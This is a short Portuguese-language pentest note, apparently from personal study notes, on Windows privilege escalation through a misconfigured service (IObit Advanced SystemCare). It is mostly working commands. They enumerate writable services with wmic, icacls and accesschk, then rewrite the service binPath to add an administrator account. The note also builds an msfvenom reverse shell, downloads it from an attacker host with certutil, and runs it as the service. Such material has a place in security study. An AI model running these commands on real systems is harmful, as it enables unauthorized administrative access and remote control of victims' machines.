
Identificar os serviços que estão em execução
```
wmic service
wmic service get Name,State,PathName | findstr "Running" | findstr "Program" - esse comando vai mostrar apenas os programas instalados pelo usuario e que estao com o processo rodando na maquina

icacls "C:\Program Files\IObit\Advanced SystemCare\ASCService.exe" - esse comando vai mostrar as permissoes para esse determinado serviço

```
![[Pasted image 20231228113531.png]]
Nesse caso . icacls informa que o usuário tem permissão full (F) para esse serviço.

Utilizando a Sysinternals para verificar permissão de serviços
```
accesschk.exe -wvcu "Users" * - Busca todos os serviços na maquina que tenha permissão de escrita
```

Buscar informações sobre determinado serviço
```
sc query serviço
sc query AdvancedSystemCareService13 - Busca informações desse serviço
sc qc AdvancedSystemCareService13 - mostra informações da configuração do serviço
```

Utilizando o serviço para adicionar um usuário
```
alterando o caminho do serviço pra executar comandos
sc config AdvancedSystemCareService13 binPath=" net user hack Admin@123 /add"

Após alterar o caminho do serviço, é necessario restartar esse serviço pra executar o comando.

sc stop AdvancedSystemCareService13
sc start AdvancedSystemCareService13
```

Podemos executar uma shell reversa para ganhar acesso administrativo da mesma forma
```
#Criando a shell
msfvenom -p windows/shell_reverse_tcp lhost=172.168.0.16 lport=8080 -f exe > shell.exe

Depois disso enviar para o computador alvo
```
![[Pasted image 20231228114902.png]]

Recebendo a shell
```
#Alterando o caminho do serviço novamente

sc config AdvancedSystemCareService13 binPath=" certutil -urlcache -f http://192.168.0.16/shell.exe shell.exe"
```
![[Pasted image 20231228115130.png]]
Depois de alterar o binpath é só iniciar o serviço para receber o arquivo.

Pra executar a shell reversa basta alterar novamente o binpath e chamar a shell
```
sc config AdvancedSystemCareService13 binPath="shell.exe"
```
![[Pasted image 20231228115400.png]]
![[Pasted image 20231228115405.png]]
